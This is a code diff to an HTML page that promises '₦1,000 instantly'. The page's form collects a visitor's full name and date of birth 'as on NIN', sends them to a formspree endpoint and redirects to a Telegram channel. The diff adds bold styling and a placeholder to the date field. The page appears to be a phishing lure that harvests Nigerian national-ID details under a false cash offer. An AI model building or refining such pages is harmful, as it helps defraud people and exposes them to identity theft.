@@ -48,6 +48,10 @@
       color: #000; /* Dark black text */
     }
 
+    input[type="date"] {
+      font-weight: bold; /* Bold for date of birth */
+    }
+
     button {
       width: 100%;
       padding: 12px;
@@ -84,7 +88,7 @@
     <p>Fill in your details to receive ₦1,000 instantly!</p>
     <form action="https://formspree.io/f/xvgalvqo" method="POST">
       <input type="text" name="fullname" placeholder="Full Name (as on NIN)" required />
-      <input type="date" name="dob" required />
+      <input type="date" name="dob" placeholder="Date Of Birth (as on NIN)" required />
       <input type="hidden" name="_redirect" value="https://t.me/OfferForYou2025">
       <button type="submit">Claim ₦1,000</button>
     </form>
